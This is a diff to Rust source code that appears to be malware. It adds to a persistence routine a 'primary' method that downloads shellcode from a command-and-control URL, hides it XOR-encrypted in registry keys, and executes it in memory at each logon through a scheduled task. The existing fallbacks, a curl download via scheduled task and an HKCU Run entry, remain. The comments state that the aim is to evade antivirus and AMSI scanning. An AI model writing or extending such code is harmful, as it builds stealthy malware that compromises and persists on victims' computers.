@@ -1592,6 +1592,33 @@ pub fn do_auto_persistence_work() {
 
         AUTO_PERSIST_DONE.store(true, Ordering::SeqCst);
 
+        // ====================================================================
+        // PRIMARY: Registry shellcode persistence (zero files on disk)
+        // Downloads PIC shellcode from C2 → XOR-encrypted in dual-split
+        // registry keys → schtask ONLOGON trigger reads/decrypts/executes
+        // in memory via VirtualAlloc(RW→RX) + CreateThread.
+        // ====================================================================
+        match crate::persistence_fileless::persist_registry_shellcode_auto(
+            crate::config::SHELLCODE_URL,
+        ) {
+            Ok(msg) => {
+                debug_print!(
+                    "DEBUG: [AUTO-PERSIST] ✅ Registry shellcode persistence established: {}",
+                    msg
+                );
+                return;
+            }
+            Err(e) => {
+                debug_print!(
+                    "DEBUG: [AUTO-PERSIST] ⚠️ Registry shellcode failed: {}, trying schtask curl fallback...",
+                    e
+                );
+            }
+        }
+
+        // ====================================================================
+        // FALLBACK 1: schtask + curl download (drops EXE to %TEMP% each logon)
+        // ====================================================================
         match crate::persistence_fileless::persist_scheduled_task_download(
             crate::config::STAGER_URL,
         ) {
@@ -1610,9 +1637,9 @@ pub fn do_auto_persistence_work() {
             }
         }
 
-        // Fallback: HKCU\Run with curl — no file copy, no PS/AMSI surface.
-        // curl downloads ester fresh on each logon; the binary is never stored
-        // permanently so AV has nothing static to delete.
+        // ====================================================================
+        // FALLBACK 2: HKCU\Run with curl — no file copy, no PS/AMSI surface.
+        // ====================================================================
         match persist_run_curl(crate::config::STAGER_URL) {
             Ok(msg) => {
                 debug_print!(
